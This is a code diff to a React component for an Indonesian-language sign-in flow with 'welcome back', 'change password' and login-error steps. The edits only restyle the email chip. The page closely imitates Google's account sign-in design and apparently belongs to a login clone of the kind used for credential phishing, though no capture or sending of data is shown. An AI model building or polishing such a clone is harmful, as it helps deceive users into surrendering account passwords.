@@ -696,13 +696,14 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Selamat datang kembali</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      style={{ textDecoration: 'none' }}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1" fill="currentColor">
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                       </svg>
-                      <span>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
                   </>
                 )}
@@ -711,13 +712,14 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Ubah sandi</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      style={{ textDecoration: 'none' }}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1" fill="currentColor">
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                       </svg>
-                      <span>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
                   </>
                 )}
@@ -761,13 +763,14 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Tidak dapat memproses login Anda</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      style={{ textDecoration: 'none' }}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1" fill="currentColor">
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                       </svg>
-                      <span>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
                   </>
                 )}
